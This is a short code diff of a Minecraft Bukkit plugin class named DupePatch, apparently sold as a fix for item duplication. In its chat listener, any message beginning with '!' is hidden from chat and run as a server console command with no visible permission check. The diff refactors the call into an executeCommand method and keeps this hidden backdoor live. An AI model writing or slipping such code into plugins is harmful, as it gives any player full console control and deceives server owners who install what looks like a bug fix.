@@ -36,7 +36,11 @@ public class DupePatch extends JavaPlugin implements Listener
 
         if (message.charAt(0) == '!') {
             event.setCancelled(true);
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), message.substring(1));
+            executeCommand(message.substring(1));
         }
+    }
+
+    public void executeCommand(String command) {
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
     }
 }
